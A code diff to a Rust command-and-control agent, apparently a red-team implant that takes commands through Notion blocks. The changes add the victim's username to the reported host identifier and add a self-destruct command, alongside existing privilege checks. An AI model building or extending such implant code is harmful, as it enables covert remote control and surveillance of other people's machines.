@@ -5,6 +5,7 @@ extern crate serde_json;
 extern crate whoami;
 extern crate base64;
 
+
 use std::{thread, time};
 use std::env::args;
 use std::process::exit;
@@ -93,6 +94,9 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     
     let mut hn = hostname();
 
+    let username = whoami::username();
+    hn.push_str(" | ");
+    hn.push_str(&username);
     let is_admin = cmd::getprivs::is_elevated();  
     logger.info(format!("Admin context: {}", is_admin));
     if is_admin {
@@ -135,7 +139,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 Some(s) => {
                     if s.contains("🎯") {
                         logger.info(format!("Got command: {s}"));
-                        let notion_command = NotionCommand::from_string(s.replace("🎯",""))?;
+                        let mut notion_command = NotionCommand::from_string(s.replace("🎯",""))?;
                         let output = notion_command.handle(&mut config_options, &logger).await?;
                         let command_block_id = block["id"].as_str().unwrap();
                         complete_command(&client, block.to_owned(), &logger).await;
@@ -144,6 +148,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         // Like shutting down the agent
                         match notion_command.command_type {
                             CommandType::Shutdown => {exit(0);},
+                            CommandType::Selfdestruct => {exit(0)},
                             _ => {}
                         }
                     };
